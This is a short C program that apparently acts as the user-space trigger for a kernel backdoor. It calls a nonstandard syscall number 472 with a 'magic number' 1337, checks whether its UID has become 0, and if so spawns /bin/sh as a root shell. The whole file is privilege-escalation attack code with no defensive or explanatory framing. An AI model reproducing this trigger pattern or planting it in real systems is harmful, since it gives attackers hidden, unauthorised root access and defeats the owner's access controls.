#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("Current UID: %d\n", getuid());

    printf("Calling syscall 472 with magic number 1337...\n");
    syscall(472, 1337);

    printf("New UID: %d\n", getuid());

    if (getuid() == 0) {
        printf("I AM GOD. Spawning root shell...\n");
        system("/bin/sh");
    } else {
        printf("Escalation failed.\n");
    }

    return 0;
}
